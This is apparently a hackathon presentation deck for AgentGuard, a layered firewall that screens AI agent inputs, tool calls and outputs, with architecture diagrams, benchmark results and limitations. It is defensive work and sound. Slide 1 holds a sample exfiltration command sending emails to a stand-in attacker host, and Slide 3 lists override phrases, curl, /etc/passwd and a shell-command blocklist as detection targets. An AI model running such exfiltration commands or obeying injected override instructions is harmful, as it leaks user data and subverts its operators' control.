# AgentGuard — Presentation Deck

![AgentGuard Logo](assets/logo.png)

**AI Unlocked 2026 · Track 5: Trustworthy AI · IIT Kharagpur · Team NamoFans**

| Animesh Raj | Atul Singh | Devansh Gupta | Prem Agarwal | Mohd Faizan Khan |
|---|---|---|---|---|
| Research & Docs | AI/ML Architecture | Backend & Cloud | Security & Safety | Backend & Cloud |

---

## Slide 1 — Problem Statement & Context

### The Users

> **Enterprise security leads** and **ML platform engineers** deploying AI agents
> in finance, healthcare, and SaaS — who need governance without rearchitecting.

---

### Three Converging Threats

```
╔══════════════════════╦═════════════════════════╦══════════════════════════╗
║  🔴 REAL ATTACKS     ║  🔒 GOVERNANCE GAP       ║  📈 SCALING RISK         ║
╠══════════════════════╬═════════════════════════╬══════════════════════════╣
║  CVE-2025-32711      ║  75% of IT leaders cite  ║  40% of enterprise apps  ║
║  EchoLeak CVSS 9.3   ║  security as #1 AI       ║  will use AI agents by   ║
║  Zero-click data     ║  deployment blocker       ║  2026  (Gartner)         ║
║  exfiltration via    ║                           ║                          ║
║  M365 Copilot        ║  60% have NOT done an     ║  Each tool call =        ║
║                      ║  AI risk assessment       ║  a new attack surface    ║
║  CVE-2026-25253      ║  in the last 12 months    ║                          ║
║  OpenClaw RCE 8.8    ║                           ║  OWASP Agentic Top 10:   ║
║  One-click exploit   ║                           ║  10 distinct attack      ║
║  on personal agents  ║                           ║  classes (2025)          ║
╚══════════════════════╩═════════════════════════╩══════════════════════════╝
```

---

### Why Existing Tools Fail

```
┌────────────────────────┬──────────────────────────┬────────────────────────────────┐
│ Tool                   │ What it does             │ What it misses                 │
├────────────────────────┼──────────────────────────┼────────────────────────────────┤
│ Static content filters │ Keyword blocklist         │ Cannot evaluate tool-call args │
│ API gateways           │ Rate limiting, auth       │ No semantic injection detection│
│ RBAC-only tools        │ Role-based access         │ No behavioral baseline / HITL  │
└────────────────────────┴──────────────────────────┴────────────────────────────────┘
```

**The gap:**  No existing solution intercepts and evaluates a tool call **before it executes**,
with awareness of who called it, why, and whether its argument came from a malicious document.

**Impact:** Adversarial PDF read by agent → `curl attacker.com?data=$EMAILS` → breach.

---

## Slide 2 — Solution Overview

### AgentGuard = A WAF for Agentic Workflows

```
  CLOUDFLARE WAF                        AGENTGUARD
  (protects web apps)                   (protects AI agents)

  Internet                              User / Orchestrator
      │                                         │
      ▼                                         ▼
  ┌──────────┐  intercept HTTP      ┌───────────────────────┐
  │ WAF      │  before origin   vs  │ Guardian (4 layers)   │  intercept tool calls
  └──────────┘                      └───────────────────────┘  before execution
      │                                         │
      ▼                                         ▼
  Origin Server                           Tool / DB / API
```

---

### What It Delivers

```
  Developer writes ONE decorator            Full 4-layer security stack fires
  ─────────────────────────────    ──▶     ──────────────────────────────────
  @guard_agent(config="ag.yaml")           L1  Input shielding (injection)
  def run(user_message: str):              L2  Output PII + toxicity filter
      return call_llm(user_message)        L3  Tool call firewall
                                           L4  RBAC + Behavioral anomaly

  No architecture changes. No new services. One YAML config.
```

---

### Results at a Glance

```
  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐
  │  95 – 97.5%  │   │     96%      │   │    0.65 s    │   │     410      │
  │  attack block│   │  CRITICAL    │   │  avg block   │   │  unit tests  │
  │    rate      │   │  block rate  │   │  (offline)   │   │  0 failures  │
  └──────────────┘   └──────────────┘   └──────────────┘   └──────────────┘
   vs 7.5% unguarded   adversarial suite   no API needed
```

**Live demo →** https://agentguard.exempl4r.xyz/

---

## Slide 3 — Key Features & User Flow

### End-to-End Security Pipeline

```
  User Input
      │
      ▼
  ╔═══════════════════════════════════════════════════════╗
  ║  L1  INPUT SHIELD                                     ║
  ║                                                       ║
  ║  Tier 0  Exact blocklist    < 0.1 ms   FREE  ──┐     ║
  ║  Tier 1  33-pattern regex     < 1 ms   FREE  ──┼──▶ BLOCK (no API call)
  ║  Tier 2  Azure Prompt Shields  ~50 ms   $$$  ──┘     ║
  ║                                                       ║
  ║  Catches: SYSTEM OVERRIDE · ignore instructions      ║
  ║           curl · /etc/passwd · jailbreak patterns    ║
  ╚═══════════════════════════════════════════════════════╝
      │  (only clean inputs reach the agent)
      ▼
  Agent Logic Runs
      │
      ▼  (every tool call intercepted before execution)
  ╔═══════════════════════════════════════════════════════╗
  ║  L4  RBAC + BEHAVIORAL  (in-process, zero API cost)   ║
  ║                                                       ║
  ║  ABAC:  role × verb × resource sensitivity × risk     ║
  ║  Outcome:  ALLOW │ DENY │ ELEVATE → human approval    ║
  ║                                                       ║
  ║  Behavioral:  Z-score · Levenshtein · read→exfil      ║
  ║               chain detection · entropy analysis      ║
  ╚═══════════════════════════════════════════════════════╝
      │
      ▼
  ╔═══════════════════════════════════════════════════════╗
  ║  L3  TOOL FIREWALL                                    ║
  ║                                                       ║
  ║  file_system  │ no .env/.pem, path allowlist          ║
  ║  sql_query    │ SELECT only — no DROP/DELETE/UPDATE   ║
  ║  shell_cmds   │ blocklist: rm curl bash sudo eval     ║
  ║  http_get/post│ domain allowlist, HTTPS, no 169.254.x ║
  ║                                                       ║
  ║  + C1 Azure entity recog on args                      ║
  ║  + C2 MELON contrastive check (opt-in, high-security) ║
  ║  + C4 HITL / AITL approval workflow                   ║
  ╚═══════════════════════════════════════════════════════╝
      │
      ▼  (agent response)
  ╔═══════════════════════════════════════════════════════╗
  ║  L2  OUTPUT GUARDRAIL                                 ║
  ║                                                       ║
  ║  Azure AI Language → PII redaction (SSN, keys, email) ║
  ║  Azure Content Safety → Toxicity filter               ║
  ╚═══════════════════════════════════════════════════════╝
      │
      ▼
  Safe Response → User
```

---

### Developer Experience — 4 Steps

```
  Step 1                Step 2               Step 3              Step 4
  ──────────────        ──────────────        ──────────────      ──────────────
  agentguard init   →   Fill .env        →   @guard_agent    →   agentguard test
  Generates             (Azure API keys)      One decorator       25+ adversarial
  agentguard.yaml                            wraps any agent     scenarios via
  + .env.example                                                  Promptfoo
```

**Dashboard** https://agentguard.exempl4r.xyz/
- `/` — Real-time OTel trace stream, layer breakdown, audit log
- `/demo` — Guarded vs. Unguarded toggle, pre-built attacks, custom prompts

---

## Slide 4 — Architecture & Technology Approach

### System Architecture

```
  ┌─────────────────────────────────────────────────────────────────────┐
  │                          AGENTGUARD                                 │
  │                                                                     │
  │  ┌────────────────┐    ┌──────────────────┐    ┌─────────────────┐ │
  │  │  Decorator     │    │   Guardian       │    │  Config Engine  │ │
  │  │  Layer         │───▶│   (orchestrator) │◀───│  agentguard.yaml│ │
  │  │                │    │                  │    │  agentguard init│ │
  │  │  @guard_agent  │    │  routes to all   │    └─────────────────┘ │
  │  │  @guard        │    │  layers in order │                         │
  │  │  @guard_input  │    │                  │    ┌─────────────────┐ │
  │  │                │    │  _notify_        │───▶│  Observability  │ │
  │  │  GuardedTool   │    │  security_event()│    │                 │ │
  │  │  Registry      │    │  (unified write) │    │ OTel → Jaeger   │ │
  │  └────────────────┘    └──────┬───────────┘    │ SQLite audit log│ │
  │                               │                └─────────────────┘ │
  │              ┌────────────────┼─────────────┐                      │
  │              ▼                ▼             ▼                       │
  │  ┌────────────────┐  ┌────────────────┐  ┌────────────────┐       │
  │  │  L1 Input      │  │  L4 Engines    │  │  L3 Tool       │       │
  │  │                │  │                │  │  Firewall      │       │
  │  │  fast_inject   │  │ L4RBACEngine   │  │                │       │
  │  │  prompt_shields│  │ Behavioral     │  │  5 guardrails  │       │
  │  │  blocklists    │  │ AnomalyDetect  │  │  + C1/C2/C4   │       │
  │  └────────────────┘  └────────────────┘  └────────────────┘       │
  │                                                                     │
  │  ┌────────────────┐                                                 │
  │  │  L2 Output     │                                                 │
  │  │  Azure PII     │                                                 │
  │  │  + Toxicity    │                                                 │
  │  └────────────────┘                                                 │
  └─────────────────────────────────────────────────────────────────────┘
```

### Data Flow

```
  str (user input)
    → Guardian.validate_input()      [L1: fast path → Azure Prompt Shields]
    → agent function executes
    → Guardian.validate_tool_call()  [L4 RBAC → L3 firewall → C1/C4 → C2]
      → tool.execute()               ← only if ALL checks pass
    → Guardian.validate_output()     [L2: PII redact + toxicity]
    → str (safe response)
```

### Technology Stack

```
  ┌──────────────────────────┬─────────────────────────────────────────────────┐
  │  Layer / Concern         │  Technology                                     │
  ├──────────────────────────┼─────────────────────────────────────────────────┤
  │  Language & packaging    │  Python 3.11+  ·  uv                            │
  │  L1 injection detection  │  Azure AI Content Safety (Prompt Shields)       │
  │                          │  + 33-pattern offline regex (free, <1ms)        │
  │  L2 output safety        │  Azure AI Language (PII)                        │
  │                          │  + Azure Content Safety (toxicity)              │
  │  L3/L4 firewall + RBAC   │  Pure Python, in-process — zero external deps   │
  │  Observability           │  OpenTelemetry → Jaeger  +  SQLite audit log    │
  │  Red-team testing        │  Promptfoo (npx)  +  DeepTeam (OWASP Top 10)   │
  │  LLM gateway             │  TrueFoundry (OpenAI-compatible)                │
  │  Live dashboard          │  FastAPI  +  https://agentguard.exempl4r.xyz/   │
  └──────────────────────────┴─────────────────────────────────────────────────┘
```

---

## Slide 5 — Design Decisions & Trade-offs

### Decision Matrix

```
  ┌──────────────────────────┬──────────────────────────────┬────────────────────────────┐
  │  Decision                │  What & Why                  │  Trade-off / Alternative   │
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  L2: Azure, not          │  Azure AI Language + Content  │  Guardrails AI covers same │
  │  Guardrails AI           │  Safety already required for  │  PII/toxicity but adds a   │
  │  (deferred)              │  L1; native trust boundary,   │  second model + dependency.│
  │                          │  one less external dep.       │  Deferred as future plugin.│
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  Tiered L1               │  Tier 0/1 (offline regex)     │  Sending all inputs to     │
  │  (offline first)         │  fires before any Azure call. │  Azure = slower + costly.  │
  │                          │  ~40–60% blocked for free.    │  Regex misses novel attacks │
  │                          │  Azure only for ambiguous.    │  → Tier 2 catches those.   │
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  ABAC + ELEVATE          │  ALLOW / DENY / ELEVATE →     │  Binary ALLOW/DENY is      │
  │  (3rd outcome)           │  HITL approval. Novel outcome │  simpler but blocks valid  │
  │                          │  not in Guardrails AI or MS   │  edge-cases. ELEVATE routes │
  │                          │  Agent Governance Toolkit.    │  to human review instead.  │
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  MELON (C2) opt-in       │  Requires 2 LLM calls;        │  Always-on = 2× LLM cost.  │
  │                          │  disabled by default.         │  Enabled for medical /     │
  │                          │  Enable in agentguard.yaml    │  financial agents only.    │
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  AITL: open-source       │  C4 supervisor uses fine-     │  Frontier LLMs (GPT-4o)    │
  │  safety LLMs, not        │  tuned safety classifiers     │  add cost per ELEVATE,     │
  │  frontier models         │  (Llama Guard 3, ShieldGemma, │  send tool args off-net,   │
  │                          │  WildGuard, Granite Guardian) │  and are non-deterministic.│
  │                          │  Self-hosted: data stays in-  │  Safety LLMs are purpose-  │
  │                          │  network, <500ms, zero API    │  built for binary APPROVE/ │
  │                          │  cost. Evaluated on Kaggle.   │  REJECT — not reasoning.   │
  ├──────────────────────────┼──────────────────────────────┼────────────────────────────┤
  │  Dual observability      │  OTel for live SRE metrics.   │  Single store is simpler   │
  │  (OTel + SQLite)         │  SQLite for compliance         │  but OTel is ephemeral;    │
  │                          │  forensics — tamper-evident,  │  compliance audits need    │
  │                          │  local, no cloud dependency.  │  a permanent local record. │
  └──────────────────────────┴──────────────────────────────┴────────────────────────────┘
```

### Complementary to Microsoft Agent Governance Toolkit

```
  AgentGuard (LLM attack surface)          MS Agent Governance Toolkit (execution env)
  ─────────────────────────────────        ──────────────────────────────────────────────
  ● Prompt injection (L1)                  ● Cryptographic agent identity
  ● PII / toxic output (L2)               ● OS-level sandboxing (Agent Hypervisor)
  ● Tool call argument validation (L3)     ● SRE reliability (SLOs, error budgets)
  ● Behavioral anomaly (L4b)  ◀──────────  ASI-10 behavioral = "in active development"
                                           AgentGuard L4b fills that gap today.
  Together: cover all 10 OWASP Agentic Top 10 risks.
```

---

## Slide 6 — Current Status, Limitations & Next Steps

### What Is Fully Working

```
  ✅ IMPLEMENTED & TESTED
  ─────────────────────────────────────────────────────────────────────────
  L1  │ 33-pattern offline regex + Azure Prompt Shields + blocklists
  L2  │ Azure AI Language PII detection + Azure Content Safety toxicity
  L3  │ 5 tool guardrails (file/sql/shell/http_get/http_post)
      │ + C1 entity recog + C2 MELON (opt-in) + C4 HITL/AITL workflow
  L4  │ L4RBACEngine (ABAC, infer_verb, infer_sensitivity)
      │ + BehavioralAnomalyDetector (5 signals)
  ─────────────────────────────────────────────────────────────────────────
  CLI       │ agentguard init · agentguard test · agentguard dashboard
  Red-team  │ Promptfoo (25+ attack scenarios) + DeepTeam (OWASP Top 10)
  AITL eval │ notebooks/llm_as_a_judge_eval.ipynb — 6 open-source safety LLM candidates on Kaggle GPU
  Audit     │ SQLite compliance log + OpenTelemetry → Jaeger
  Dashboard │ https://agentguard.exempl4r.xyz/ (live, deployed)
  Tests     │ 410 unit tests · 0 failures
```

### Benchmark Results

```
  Adversarial comparison (40 tests each run):

  Run 1                               Run 2
  ───────────────────────────         ───────────────────────────
  GuardedBot      97.5% secure        GuardedBot      95.0% secure
  Unguarded       47.5% secure        Unguarded        7.5% secure
  Improvement     +50.0 pp            Improvement     +87.5 pp

  CRITICAL attack block rate: 96%     Fast-path avg: 0.65 s (offline tier)
```

### Known Limitations

```
  ⚠  L4 behavioral baselines   Seeded with synthetic avg (5 req/min, std 2) — needs real traffic
  ⚠  Redis caching              Config-stubbed, not wired — hot path is ~200 ms instead of <50 ms
  ⚠  Spotlighting               Requires Azure AI Foundry endpoint — not available in prototype
  ⚠  AutoGen / Magentic-One     Dependency installed; adapter code not written
```

### Next Steps (with Mentorship)

```
  1  Per-agent behavioral baselines via OTel telemetry → ClickHouse time-series
  2  SPIFFE/SVID cryptographic agent identity (pairs with MS Agent Governance Toolkit)
  3  Redis caching: sub-50 ms hot path vs current 200 ms
  4  Guardrails AI as optional L2 plugin for orgs already running it
  5  AutoGen / Magentic-One adapters for zero-code adoption
```

---

## References

| # | Citation |
|---|---|
| 1 | SentinelAgent, arXiv:2505.24201 (May 2025) — graph-based MAS anomaly detection |
| 2 | aembit.io, Jan 2026 — 7 signal types for non-human identity behavioral monitoring |
| 3 | Lee & Xiang, IEEE S&P 2001 — Shannon entropy for anomaly detection (foundational) |
| 4 | Greshake et al., arXiv:2302.12173 — indirect prompt injection attacks |
| 5 | OWASP Top 10 for LLM Applications 2025 |
| 6 | microsoft/agent-governance-toolkit — OWASP Agentic Top 10; behavioral detection on roadmap |
| 7 | CVE-2025-32711, EchoLeak (CVSS 9.3) — zero-click data exfiltration via M365 Copilot |
| 8 | CVE-2026-25253, OpenClaw RCE (CVSS 8.8) — personal AI agent attack surface |
